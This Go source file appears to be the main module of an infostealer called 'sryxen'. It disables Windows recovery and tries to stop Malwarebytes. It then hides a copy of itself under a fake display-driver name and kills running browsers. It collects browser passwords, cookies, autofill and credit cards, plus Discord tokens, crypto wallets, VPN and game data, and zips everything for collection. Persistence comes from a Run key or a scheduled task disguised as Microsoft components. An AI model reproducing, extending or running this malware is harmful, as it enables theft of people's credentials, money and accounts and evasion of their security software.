package main

import (
	"encoding/json"
	"archive/zip"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"sryxen/banking"
	"sryxen/games"
	"sryxen/socials"
	"sryxen/target"
	"sryxen/utils"
	"sryxen/vpn"
	"strings"
	"syscall"
	"io"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var browsers = []string{
	"chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
	"7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe",
}

func saveStringToFile(path string, data []string) error {
	dir := filepath.Dir(path)
	err := os.MkdirAll(dir, os.ModePerm)
	if err != nil {
		return err
	}

	file, err := os.Create(path)
	if err != nil {
		return err
	}
	defer file.Close()

	for _, entry := range data {
		_, err := file.WriteString(entry + "\n")
		if err != nil {
			return err
		}
	}
	return nil
}

func IsAdmin() bool {
	ret, _, _ := syscall.NewLazyDLL("shell32.dll").NewProc("IsUserAnAdmin").Call()
	return ret != 0
}

func grabGecko(BROWSERS *utils.Browsers, outputDir string) {
	browsers, _ := utils.DiscoverGecko()
	for _, browser := range browsers {
		password, err := target.GetGeckoPasswords(browser)
		if err == nil && len(password) > 0 {
			BROWSERS.Passwords = append(BROWSERS.Passwords, password...)
			saveStringToFile(filepath.Join(outputDir, "gecko", "passwords.txt"), convertPasswordsToStrings(password))
		}

		cookie, err := target.GetGeckoCookies(browser)
		if err == nil && len(cookie) > 0 {
			BROWSERS.Cookies = append(BROWSERS.Cookies, cookie...)
			saveStringToFile(filepath.Join(outputDir, "gecko", "cookies.txt"), convertCookiesToStrings(cookie))
		}

		history, err := target.GetGeckoHistory(browser)
		if err == nil && len(history) > 0 {
			BROWSERS.History = append(BROWSERS.History, history...)
			saveStringToFile(filepath.Join(outputDir, "gecko", "history.txt"), convertHistoryToStrings(history))
		}

		autofill, err := target.GetGeckoAutofill(browser)
		if err == nil && len(autofill) > 0 {
			BROWSERS.AutoFill = append(BROWSERS.AutoFill, autofill...)
			saveStringToFile(filepath.Join(outputDir, "gecko", "autofill.txt"), convertAutofillToStrings(autofill))
		}

		download, err := target.GetGeckoDownloads(browser)
		if err == nil && len(download) > 0 {
			BROWSERS.Download = append(BROWSERS.Download, download...)
			saveStringToFile(filepath.Join(outputDir, "gecko", "downloads.txt"), convertDownloadsToStrings(download))
		}

		card, err := target.GetGeckoCreditCards(browser)
		if err == nil && len(card) > 0 {
			BROWSERS.CreditCard = append(BROWSERS.CreditCard, card...)
			saveStringToFile(filepath.Join(outputDir, "gecko", "creditcards.txt"), convertCreditCardsToStrings(card))
		}
	}
}

func convertPasswordsToStrings(passwords []utils.Passwords) []string {
	var result []string
	for _, p := range passwords {
		result = append(result, fmt.Sprintf("Username: %s, Password: %s, URL: %s", p.Username, p.Password, p.Url))
	}
	return result
}

func convertCookiesToStrings(cookies []utils.Cookie) []string {
	var result []string
	for _, c := range cookies {
		result = append(result, fmt.Sprintf("Site: %s, Name: %s, Value: %s, Path: %s", c.Site, c.Name, c.Value, c.Path))
	}
	return result
}

func convertHistoryToStrings(history []utils.History) []string {
	var result []string
	for _, h := range history {
		result = append(result, fmt.Sprintf("URL: %s, Title: %s, VisitCount: %d", h.Url, h.Title, h.VisitCount))
	}
	return result
}

func convertAutofillToStrings(autofill []utils.Autofill) []string {
	var result []string
	for _, a := range autofill {
		result = append(result, fmt.Sprintf("Name: %s, Value: %s", a.Name, a.Value))
	}
	return result
}

func convertDownloadsToStrings(downloads []utils.Download) []string {
	var result []string
	for _, d := range downloads {
		result = append(result, fmt.Sprintf("TargetPath: %s, URL: %s, ReceivedBytes: %d", d.TargetPath, d.Url, d.ReceivedBytes))
	}
	return result
}

func convertCreditCardsToStrings(cards []utils.CreditCard) []string {
	var result []string
	for _, c := range cards {
		result = append(result, fmt.Sprintf("CardNumber: %s, Expiration: %02d/%d", c.CardNumber, c.ExpirationMonth, c.ExpirationYear))
	}
	return result
}

func getTempDir() (string, error) {
	userName := strings.ToLower(os.Getenv("USERNAME"))
	if userName == "" {
		return "", errors.New("could not retrieve username")
	}

	tempDir := filepath.Join(os.TempDir(), userName)

	err := os.MkdirAll(tempDir, os.ModePerm)
	if err != nil {
		return "", err
	}

	return tempDir, nil
}

func savePCSpecsToFile(outputDir string, pcSpec utils.PC) error {
	filePath := filepath.Join(outputDir, "pc_specifications.json")

	file, err := os.Create(filePath)
	if err != nil {
		return fmt.Errorf("could not create PC specifications file: %v", err)
	}
	defer file.Close()

	pcJSON, err := json.MarshalIndent(pcSpec, "", "  ")
	if err != nil {
		return fmt.Errorf("could not marshal PC specifications to JSON: %v", err)
	}

	_, err = file.Write(pcJSON)
	if err != nil {
		return fmt.Errorf("could not write to PC specifications file: %v", err)
	}

	return nil
}

func IsAlreadyRunning() bool {
	const AppID = "3575659c-bb47-448e-a514-22865732bbc"

	_, err := windows.CreateMutex(nil, false, syscall.StringToUTF16Ptr(fmt.Sprintf("Global\\%s", AppID)))
	return err != nil
}

func createRegistryPersistence(path string) {
	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err != nil {
		fmt.Println("Error opening registry key", err)
		return
	}
	defer k.Close()

	_, _, err = k.GetStringValue("Microsoft Display Driver Manager")
	if err != nil {
		err = k.SetStringValue("Microsoft Display Driver Manager", path)
		if err != nil {
			fmt.Println(err)
			return
		}
	}
}

func createScheduledTaskPersistence(path string) {
	cmd := exec.Command("schtasks.exe", "/create", "/tn", "Microsoft Defender Threat Intelligence Handler", "/sc", "ONLOGON", "/tr", path, "/rl", "HIGHEST")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
}

func zipDirectory(sourceDir, zipFile string) error {
	zipOut, err := os.Create(zipFile)
	if err != nil {
		return fmt.Errorf("could not create zip file: %v", err)
	}
	defer zipOut.Close()

	zipWriter := zip.NewWriter(zipOut)
	defer zipWriter.Close()

	err = filepath.Walk(sourceDir, func(filePath string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if !info.IsDir() {
			relativePath, err := filepath.Rel(sourceDir, filePath)
			if err != nil {
				return err
			}

			zipFileWriter, err := zipWriter.Create(relativePath)
			if err != nil {
				return err
			}

			file, err := os.Open(filePath)
			if err != nil {
				return err
			}
			defer file.Close()

			_, err = io.Copy(zipFileWriter, file)
			if err != nil {
				return err
			}
		}
		return nil
	})

	return err
}


func main() {
	if IsAlreadyRunning() {
		return
	}

	if IsAdmin() {
		err := exec.Command("reagentc.exe", "/disable").Run()
		if err != nil {
			fmt.Printf("Failed to run reagentc.exe: %v\n", err)
		}

		whatthesigma := os.Getenv("ProgramFiles") + `\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe`
		sigmaarg := "--stopservice"
		erm := exec.Command(whatthesigma, sigmaarg)
		err = erm.Run()
		if err != nil {
			fmt.Printf("Failed to stop Malwarebytes service: %v\n", err)
		}
	}

	executablePath, err := os.Executable()
	if err != nil {
		fmt.Print(err)
		return
	}
	newPath := filepath.Join(os.Getenv("APPDATA"), "DisplayDriverUpdater.exe")

	if !strings.Contains(executablePath, "AppData") {
		src, err := os.Open(executablePath)
		if err != nil {
			fmt.Print(err)
			return
		}
		defer src.Close()

		dest, err := os.Create(newPath)
		if err != nil {
			fmt.Print(err)
			return
		}
		defer dest.Close()

		_, err = io.Copy(dest, src)
		if err != nil {
			fmt.Print(err)
			return
		}
	}

	ptr, err := syscall.UTF16PtrFromString(newPath)
	if err != nil {
		fmt.Println(err)
		return
	}
	err = syscall.SetFileAttributes(ptr, syscall.FILE_ATTRIBUTE_HIDDEN)
	if err != nil {
		fmt.Println(err)
		return
	}


	for _, browser := range browsers {
		exec.Command("taskkill", "/F", "/IM", browser).Run()
	}

	var BROWSERS utils.Browsers
	var PC utils.PC

	outputDir, err := getTempDir()
	if err != nil {
		return
	}

	done := make(chan struct{}, 7)

	go func() {
		grabGecko(&BROWSERS, outputDir)
		done <- struct{}{}
	}()

	go func() {
		socials.Run()
		done <- struct{}{}
	}()

	go func() {
		target.ChromiumFetch()
		done <- struct{}{}
	}()

	go func() {
		CryptoWallets.Run()
		done <- struct{}{}
	}()

	go func() {
		vpn.Run()
		done <- struct{}{}
	}()

	go func() {
		Games.Run()
		done <- struct{}{}
	}()

	go func() {
		PC, err = target.GetComputerSpecifications()
		if err != nil {
			done <- struct{}{}
			return
		}
		done <- struct{}{}
	}()

	go func() {
		tokens, err := socials.GetDiscordTokens()
		if err == nil {
			saveStringToFile(filepath.Join(outputDir, "discord_tokens.txt"), tokens)
		}
		done <- struct{}{}
	}()

	for i := 0; i < 7; i++ {
		<-done
	}

	savePCSpecsToFile(outputDir, PC)
	for _, browser := range browsers {
		exec.Command("taskkill", "/F", "/IM", browser).Run()
	}
	userName := strings.ToLower(os.Getenv("USERNAME"))
	zipFile := filepath.Join(os.TempDir(), fmt.Sprintf("%s.zip", userName))

	err = zipDirectory(outputDir, zipFile)
	if err != nil {
		return
	}

	fmt.Println("Temp directory zipped successfully:", zipFile)

	if IsAdmin() {
		createScheduledTaskPersistence(newPath)
	} else {
		createRegistryPersistence(newPath)
	}
}
